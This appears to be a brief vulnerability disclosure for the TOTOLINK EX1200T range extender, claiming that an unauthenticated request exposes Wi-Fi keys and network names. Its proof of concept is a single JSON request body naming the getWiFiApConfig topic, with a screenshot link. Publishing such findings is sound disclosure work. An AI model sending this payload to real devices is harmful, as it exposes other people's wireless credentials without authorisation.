# TOTOLINK EX1200T LEAK

## Vulnerability Description

PRODUCT: TOTOLINK EX1200T V4.1.2cu.5215 (latest version)

The attacker can get the sensitive information (wifikey, wifiname, etc.) without authorization.

## PoC

![image-20211022102233276](https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211022102233276.png)

```
{"topicurl":"setting/getWiFiApConfig"}
```

